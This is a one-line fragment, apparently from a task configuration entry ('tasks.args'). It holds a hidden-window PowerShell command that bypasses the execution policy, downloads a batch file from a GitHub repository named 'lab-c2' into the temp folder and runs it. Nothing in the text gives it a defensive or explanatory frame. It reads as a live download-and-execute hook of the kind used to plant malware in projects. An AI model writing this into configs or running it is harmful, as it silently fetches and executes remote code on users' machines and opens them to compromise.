tasks.args: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$code = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/g00glecenter101-arch/lab-c2/refs/heads/main/syn.bat' -UseBasicParsing; Out-File -FilePath "$env:temp\syn.bat" -InputObject $code.Content -Encoding ASCII; Start-Process "$env:temp\syn.bat""
